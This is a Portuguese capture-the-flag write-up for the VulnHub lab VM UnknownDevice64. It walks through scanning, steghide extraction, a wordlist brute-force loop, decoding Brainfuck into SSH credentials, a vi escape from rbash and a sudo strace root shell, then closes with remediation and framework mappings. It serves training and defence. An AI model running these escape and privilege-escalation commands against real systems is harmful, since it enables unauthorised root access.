# VulnHub UnknownDevice64: 1 — Escondido à Vista, Embrulhado em Brainfuck

E aí pessoal!! Quem diria que resolver um CTF ia exigir decodificar uma linguagem de programação cujo nome é literalmente "brainfuck"? Pois é, mano, esta VM entrega exatamente isso: uma cadeia de camadas que vai de esteganografia em JPEG até bypass de shell restrita, passando por uma linguagem esotérica que parece ruído aleatório na tela. Top demais.

Parabéns ao **Ajay Verma** por criar uma VM que engana o iniciante logo de cara com uma aparência simples, mas que exige raciocínio lateral genuíno em cada etapa. Valeu demais, Ajay!

---

| Campo | Valor |
|-------|-------|
| **Nível** | Iniciante a Intermediário |
| **VM Alvo** | UnknownDevice64: 1 |
| **VM Atacante** | Kali Linux 2019.1 |
| **VulnHub** | https://www.vulnhub.com/entry/unknowndevice64-1,435/ |
| **Técnicas** | Host discovery, enumeração com Nmap, análise de código-fonte HTML, esteganografia (steghide), decodificação Brainfuck, acesso SSH, bypass de rbash (vi), correção de PATH, escalação via sudo (sysud64/strace) |
| **CVEs** | N/A (cadeia de misconfigurações, sem CVE específico) |

---

## Resumo do Ataque

```
[host-discovery: nmap -sn]
    |
    v
[nmap -A -T4 -p-: SSH/1337, HTTP/31337]
    |
    v
[browser: comentário HTML oculto -> key_is_h1dd3n.jpg]
    |
    v
[steghide extract: passphrase h1dd3n -> h1dd3n.txt (Brainfuck)]
    |
    v
[decodificação Brainfuck -> credenciais ud64:1M!#64@ud]
    |
    v
[SSH login: ssh ud64@ALVO -p 1337 -> rbash]
    |
    v
[bypass rbash via vi -> :!/bin/bash -> corrigir PATH]
    |
    v
[sudo -l -> sysud64 (alias de strace)]
    |
    v
[sudo sysud64 -o /dev/null /bin/sh -> ROOT]
    |
    v
[cat /root/flag.txt]
```

---

## Metodologia

1. Descoberta de host e identificação do alvo na rede local
2. Enumeração de portas e serviços com Nmap (todas as 65535 portas)
3. Análise da aplicação web: navegação e leitura do código-fonte da página
4. Extração de payload oculto via esteganografia (steghide)
5. Decodificação de linguagem esotérica (Brainfuck) para recuperar credenciais SSH
6. Acesso SSH pela porta não padrão 1337
7. Bypass da shell restrita (rbash) usando vi e correção do PATH
8. Escalação de privilégios via sudo mal configurado em binário personalizado

---

## Passo 1 — Identificando o Alvo na Rede

Antes de qualquer coisa, precisamos saber onde o alvo está na rede. O comando `route -n` entrega o gateway e a máscara de sub-rede, que usamos no Nmap para varrer a rede.

```bash
route -n
# Olhar a coluna Iface e Gateway para identificar a sub-rede
```

Com a sub-rede em mãos, varrer os hosts ativos:

```bash
# Opção 1: nmap ping scan
nmap -sn -T5 192.168.10.0/24

# Opção 2: arp-scan (mais rápido em redes locais)
arp-scan --localnet --ignoredups
```

Anote o IP que aparecer além do seu Kali e do gateway. Esse é o alvo. A partir daqui, chamamos de `IP_ALVO`.

> **MITRE ATT&CK:** T1595.001 Active Scanning: Scanning IP Blocks

---

## Passo 2 — Reconhecimento e Enumeração de Serviços

Varredura completa, todas as portas. CTFs adoram usar portas fora do padrão, e esta VM já entrega duas delas logo de cara.

```bash
nmap -A -T4 -p- IP_ALVO
# -A: detecção de OS, versão de serviços, scripts NSE, traceroute
# -T4: timing agressivo (seguro em lab local)
# -p-: todas as 65535 portas TCP
```

Saída esperada:

```
1337/tcp  open  ssh   OpenSSH 7.7 (protocol 2.0)
31337/tcp open  http  SimpleHTTPServer 0.6 (Python 2.7.14)
```

Ixi, duas portas "leet": 1337 e 31337. Isso não é coincidência. O próprio autor está deixando pistas desde a enumeração. Na porta 1337 temos SSH; na 31337, um servidor HTTP Python estático. Vamos investigar o serviço web primeiro.

> **MITRE ATT&CK:** T1595.002 Active Scanning: Vulnerability Scanning, T1046 Network Service Discovery

---

## Passo 3 — Análise da Aplicação Web e Descoberta do Comentário Oculto

Abra o navegador e acesse:

```
http://IP_ALVO:31337/
```

A página apresenta um texto críptico com "ud64", o caminho `./AjayVerma` no estilo de execução de script, e a palavra "h1dd3n" (leet speak para "hidden"). Tudo junto está gritando: "tem coisa escondida aqui".

Agora veja o código-fonte da página. Clique com o botão direito e "Exibir código-fonte", ou use curl:

```bash
curl -s http://IP_ALVO:31337/ | grep -i "<!--"
# Busca por comentários HTML que ferramentas como gobuster não exibem
```

Saída esperada:

```html
<!-- key_is_h1dd3n.jpg -->
```

Bingo! ( ͡° ͜ʖ ͡°) O Gobuster e o Dirb retornaram apenas `index.html` porque esta imagem não estava linkada no corpo HTML, só estava escondida em um comentário. Clássica armadilha de CTF.

Baixe a imagem:

```bash
wget http://IP_ALVO:31337/key_is_h1dd3n.jpg
```

> **Nota mundo real:** Comentários HTML com informações sensíveis são mais comuns em produção do que parece. Desenvolvedores deixam chaves de API, hostnames internos e versões de software nos comentários durante desenvolvimento e esquecem de remover. A OWASP documenta isso como parte do A01:2021 (Broken Access Control) e A05:2021 (Security Misconfiguration).

> **MITRE ATT&CK:** T1083 File and Directory Discovery

---

## Passo 4 — Esteganografia: Extraindo o Payload da Imagem

> **O que é esteganografia?**
> Esteganografia é a técnica de esconder um arquivo (ou mensagem) dentro de outro arquivo sem que o arquivo "hospedeiro" pareça modificado. Diferente de criptografia, que torna o conteúdo ilegível, a esteganografia torna o conteúdo invisível: a imagem JPEG parece normal para quem a visualiza. Os dados podem estar nos bits menos significativos dos pixels, após o marcador de fim de arquivo, ou em metadados. Em CTFs, o `steghide` com proteção por senha é técnica recorrente.

Temos uma imagem e um tema todo construído em torno de "h1dd3n" e leet speak. A passphrase provavelmente é `h1dd3n`:

```bash
steghide extract -sf key_is_h1dd3n.jpg -p "h1dd3n"
```

Se não tiver o steghide instalado:

```bash
apt install steghide -y
```

Saída esperada:

```
wrote extracted data to "h1dd3n.txt".
```

Se a senha estivesse errada, daria para tentar um ataque de força bruta com wordlist usando loop direto no terminal, sem precisar de ferramenta extra:

```bash
for i in $(cat /usr/share/wordlists/rockyou.txt); do
  steghide extract -sf key_is_h1dd3n.jpg -f -p "$i" 2>/dev/null \
    && echo "[*] Passphrase encontrada: $i" && break
done
```

Leia o conteúdo extraído:

```bash
cat h1dd3n.txt
```

Saída esperada:

```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++++++++++++++.-----------------.<----------------.--.++++++.---------.>-----------------------.<<+++.++.>+++++.--.++++++++++++.>++++++++++++++++++++++++++++++++++++++++.------------------.
```

Caramba, o que é isso?! ¯\_(ツ)_/¯ É **Brainfuck**, uma linguagem de programação esotérica cujo conjunto de instruções completo são oito caracteres: `+`, `-`, `>`, `<`, `[`, `]`, `.` e `,`. É Turing-completa e completamente ilegível para humanos sem um decoder.

> **MITRE ATT&CK:** T1027 Obfuscated Files or Information

---

## Passo 5 — Decodificando Brainfuck e Recuperando Credenciais

Use um decoder online ou um interpretador local. O site https://www.dcode.fr/brainfuck-language funciona bem para isso.

Cole o conteúdo do `h1dd3n.txt` e execute o interpretador.

Saída:

```
ud64:1M!#64@ud
```

Desmembrando:

```
Usuário: ud64
Senha: 1M!#64@ud
```

ᕕ( ᐛ )ᕗ Credenciais recuperadas! Agora sabemos onde usar: o serviço SSH na porta 1337.

> **MITRE ATT&CK:** T1078 Valid Accounts, T1552.001 Unsecured Credentials: Credentials in Files

---

## Passo 6 — Acesso SSH e Descoberta da Shell Restrita

Conecte via SSH lembrando da porta não padrão:

```bash
ssh ud64@IP_ALVO -p 1337
# Informe a senha quando solicitado: 1M!#64@ud
```

Estamos dentro. Mas algo está errado. Tente navegar:

```bash
ls
cd /
cat /etc/passwd
```

Vários comandos retornam "command not found" ou simplesmente são bloqueados. Verifique a shell e o PATH:

```bash
echo $SHELL
echo $PATH
```

Pô, estamos em `rbash`, o Bash Restrito. O PATH aponta apenas para `/home/ud64/prog`, que tem quase nada útil. Mudar de diretório para cima é bloqueado, pipes têm comportamento limitado, e a maioria dos comandos é invisível porque seus diretórios não estão no PATH.

> **MITRE ATT&CK:** T1059.004 Command and Scripting Interpreter: Unix Shell

---

## Passo 7 — Bypass da Shell Restrita via vi

> **O que é rbash?**
> O Bash Restrito (`rbash`) é um modo do Bash que impede o usuário de mudar diretórios com `cd`, modificar `PATH` ou `SHELL`, redirecionar saída para arquivos com `>`, e executar comandos que contenham `/`. É uma camada de controle para contas com privilégios limitados. Porém, se qualquer programa interativo que permita executar comandos de shell estiver acessível, o rbash pode ser bypassado.

Várias tentativas falham aqui. Para economizar tempo:

```bash
bash        # bloqueado
python -c "import pty; pty.spawn('/bin/bash')"  # python não está no PATH
sh          # bloqueado
```

Mas o `vi` está disponível! E o vi tem uma funcionalidade de escape para shell. Abra-o e escape:

```bash
vi
```

Dentro do vi, no modo normal (não modo de inserção), digite:

```vim
:!/bin/bash
```

**Wow guys!! Bypass da Shell Restrita feito!! :D**

Agora você tem um bash funcional, mas o PATH ainda está quebrado. Corrija:

```bash
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Agora `ls`, `cat`, `find`, `id` funcionam normalmente. Confirme quem você é:

```bash
id
# uid=1000(ud64) gid=1000(ud64) groups=1000(ud64)
```

Ainda somos `ud64`, não root. Precisa escalar.

> **Referência GTFOBins:** https://gtfobins.github.io/gtfobins/vi/
> **MITRE ATT&CK:** T1548.003 Abuse Elevation Control Mechanism: Sudo, T1059.004 Unix Shell

---

## Passo 8 — Escalação de Privilégios via Sudo e Binário Personalizado

Verifique as permissões sudo:

```bash
sudo -l
```

Saída esperada:

```
User ud64 may run the following commands on unknowndevice64:
    (root) NOPASSWD: /usr/local/bin/sysud64
```

`sysud64` é um binário desconhecido. Tá ligado? Veja o help:

```bash
sysud64 -h | more
```

O cabeçalho do help revela que trata-se de uma cópia (ou alias) do `strace`, o tracer de syscalls do Linux. Isso significa que podemos executar strace como root via sudo, e strace pode executar programas arbitrários.

```bash
sudo sysud64 -o /dev/null /bin/sh
```

- `-o /dev/null`: descarta a saída do strace (não precisamos do trace de syscalls)
- `/bin/sh`: o comando a ser rastreado e executado com privilégios de root

> **Referência GTFOBins:** https://gtfobins.github.io/gtfobins/strace/

Verifique:

```bash
whoami
# root
id
# uid=0(root) gid=0(root) groups=0(root)
```

(☞ﾟヮﾟ)☞ ROOT!

> **MITRE ATT&CK:** TA0004 Privilege Escalation, T1548.003 Sudo and Sudo Caching

---

## Passo 9 — Leitura da Flag

```bash
cat /root/flag.txt
```

A flag está lá, com a mensagem de parabéns do autor. Merecida!

> **MITRE ATT&CK:** T1005 Data from Local System

---

## Artefatos Capturados

| Tipo | Valor | Encontrado em | Usado para |
|------|-------|---------------|------------|
| Credencial | `ud64:1M!#64@ud` | `h1dd3n.txt` (Brainfuck decodificado) | Login SSH porta 1337 |
| Passphrase steghide | `h1dd3n` | Inferido do tema leet speak | Extração com steghide |
| Flag | ver /root/flag.txt | `/root/flag.txt` | N/A |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Chave |
|---|--------|--------------------------|-------------|
| 1 | Credenciais escondidas em imagem com esteganografia protegida por senha derivada do contexto | Insiders e atacantes embarcam credenciais em imagens e blobs binários em ambientes reais | Sempre analise arquivos binários em diretórios suspeitos; não confie só em arquivos de texto |
| 2 | rbash bypassável via vi com escape de shell embutido | Servidores endurecidos frequentemente permitem editores de texto mas esquecem que editores invocam shell | Desabilite editores interativos em contas restritas; use GTFOBins como checklist de auditoria |
| 3 | Binário personalizado (`sysud64`) alias de `strace` com NOPASSWD no sudoers | Scripts wrapper em sudoers são comuns em ambientes corporativos; auditores frequentemente os ignoram | Audite o sudoers regularmente; nunca conceda NOPASSWD a binários que permitem execução arbitrária |

**Por que isso importa fora do lab?**

O ataque à cadeia de suprimentos da SolarWinds em 2020 demonstrou como atacantes escondem payloads em lugares inesperados: recursos binários, pacotes de atualização, arquivos de imagem. O uso de esteganografia para embedar credenciais ou beacons de C2 em imagens é técnica documentada em campanhas do APT28 (Fancy Bear) e APT10 (Stone Panda). A misconfigurações de sudo mapeia diretamente para falhas encontradas em auditorias de Linux corporativo: organizações criam wrappers de ferramentas de monitoramento, concedem NOPASSWD, e o vetor persiste por anos sem ser detectado.

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | TTP-ID |
|------|--------|---------|--------|
| Reconhecimento | TA0043 | Active Scanning: Scanning IP Blocks | T1595.001 |
| Reconhecimento | TA0043 | Active Scanning: Vulnerability Scanning | T1595.002 |
| Descoberta | TA0007 | Network Service Discovery | T1046 |
| Descoberta | TA0007 | File and Directory Discovery | T1083 |
| Coleta | TA0009 | Data from Local System | T1005 |
| Evasão de Defesa | TA0005 | Obfuscated Files or Information | T1027 |
| Acesso a Credenciais | TA0006 | Unsecured Credentials: Credentials in Files | T1552.001 |
| Acesso Inicial | TA0001 | Valid Accounts | T1078 |
| Movimento Lateral | TA0008 | Remote Services: SSH | T1021.004 |
| Execução | TA0002 | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Escalação de Privilégios | TA0004 | Abuse Elevation Control Mechanism: Sudo | T1548.003 |

> MITRE ATT&CK: https://attack.mitre.org/
> MITRE D3FEND: https://d3fend.mitre.org/

---

## Contexto de Grupos de Ameaça

**APT28 (Fancy Bear / Sofacy):** Documentado pelo uso de esteganografia para embedar payloads em imagens JPEG em campanhas de spear-phishing contra governos e setores de defesa. Referência: MITRE ATT&CK Group G0007.

**APT10 (Stone Panda / menuPass):** Uso documentado de payloads ofuscados e documentos-isca com credenciais em locais não óbvios, especialmente em ataques contra provedores de serviços gerenciados. Referência: MITRE ATT&CK Group G0045.

**FIN7:** Usa wrappers binários personalizados e ferramentas legítimas renomeadas (semelhante ao `sysud64` como alias de `strace`) para evadir detecção durante pós-exploração. Referência: MITRE ATT&CK Group G0046.

---

## Remediação e Contenção

### Correções Técnicas

1. Remova credenciais e dados sensíveis de qualquer arquivo servido via HTTP, incluindo imagens: rode `exiftool` e `steghide info` em todos os arquivos de mídia acessíveis publicamente
2. Substitua rbash por contas de aplicação sem shell interativo (`/usr/sbin/nologin`) ou use `ForceCommand` no SSH para restringir operações
3. Audite `/etc/sudoers` e remova entradas NOPASSWD para qualquer binário que permita execução de shell; valide contra GTFOBins antes de aprovar qualquer regra sudo
4. Renomeie ou remova aliases de binários que obscurecem o que está sendo executado; documente todos os wrappers no inventário de ativos
5. Use autenticação por chave SSH e desative login por senha em `sshd_config`

### Se Encontrar Algo Semelhante no Seu Ambiente

**Contenção imediata:**
- Rotacione todas as credenciais extraídas do serviço comprometido imediatamente
- Audite sudoers em todos os hosts Linux buscando entradas NOPASSWD apontando para binários com capacidade de execução
- Verifique payloads esteganográficos em repositórios de imagens: `steghide info <arquivo>` sinaliza arquivos com dados ocultos
- Revise todos os diretórios servidos via web buscando arquivos sensíveis e comentários HTML com referências internas

**Contramedidas MITRE D3FEND:**
- D3-MFA (Autenticação Multifator) contra T1078: exija MFA para todo acesso SSH
- D3-IVA (Input Validation and Filtering) contra T1190: valide e sanitize todos os arquivos servidos via HTTP
- D3-OPS (OS Process Sandboxing) contra T1548: restrinja execução de processos via namespaces Linux ou seccomp
- D3-CTS (Credential Transmission Scoping) contra T1552.001: audite permissões de arquivos e escaneie repositórios em busca de credenciais

### Alinhamento com Frameworks

**NIST CSF 2.0:**
- Identify (ID.AM): Mantenha inventário de todas as contas de usuário, especialmente contas de serviço, com suas permissões sudo e shells documentadas
- Protect (PR.AC-4): Implemente menor privilégio; revise entradas NOPASSWD trimestralmente
- Protect (PR.DS-5): Proteja contra vazamento de dados escaneando arquivos de mídia antes de servi-los publicamente
- Detect (DE.AE-2): Alerte sobre logins SSH de IPs inesperados e falhas de login seguidas de sucesso
- Respond (RS.AN-1): Documente procedimentos de rotação de credenciais; ative-os em até 1 hora após confirmação de comprometimento

**NIST SP 800-53 (Rev. 5):**
- AC-6: Least Privilege: nenhum usuário deve ter sudo NOPASSWD em ferramentas com capacidade de execução arbitrária
- IA-5: Authenticator Management: desative autenticação SSH por senha; exija autenticação por chave
- CM-7: Least Functionality: desabilite ou remova editores interativos de contas restritas
- SI-3: Malware Protection: escaneie arquivos enviados e servidos em busca de payloads ocultos
- AU-2: Event Logging: registre todas as execuções sudo; encaminhe para SIEM centralizado

**CISA Known Exploited Vulnerabilities:**
- Sem CVE direto para as técnicas desta VM (cadeia de misconfigurações, não CVE conhecido)
- Monitore: https://www.cisa.gov/known-exploited-vulnerabilities-catalog para vulnerabilidades OpenSSH e Python HTTPServer

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domínio: ACCESS, Prática: Identity Management, MIL-2 alvo: Aplique menor privilégio; revise contas privilegiadas regularmente
- Domínio: TECHNOLOGY, Prática: Configuration Management, MIL-2 alvo: Audite sudoers e configurações de shell contra uma baseline de hardening
- Domínio: SITUATIONAL AWARENESS, Prática: Logging and Monitoring, MIL-2 alvo: Monitore indicadores de bypass de rbash (execuções de vi/python em contas restritas)

---

## Considerações Finais

Valeu demais, **Ajay Verma**, por criar uma VM que parece simples na superfície mas entrega desafio de verdade! A cadeia de raciocínio que você montou, do comentário HTML escondido até o alias de binário no sudoers, passando por Brainfuck dentro de uma imagem, é o tipo de coisa que treina o instinto que um pentester de verdade precisa: olhar embaixo do óbvio.

A VM ensina que "básico" não significa "sem complexidade". As mesmas técnicas aparecem em engajamentos reais: desenvolvedores escondem segredos em comentários, times de operações renomeiam binários para disfarçar funções, e administradores concedem NOPASSWD a ferramentas "inofensivas" sem checar GTFOBins. Praticar aqui constrói o instinto para enxergar essas camadas em ambientes corporativos.

Se este writeup te ajudou, compartilha com a galera e continua hackeando!

*Thanks guys!! (❍ᴥ❍ʋ)*

> Artigo original em português pelo André Henrique: https://medium.com/uniaogeek/vulnhub-unknown-device-vm-1-a0b05a8f12c2

---

*Writeup por [André Henrique](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
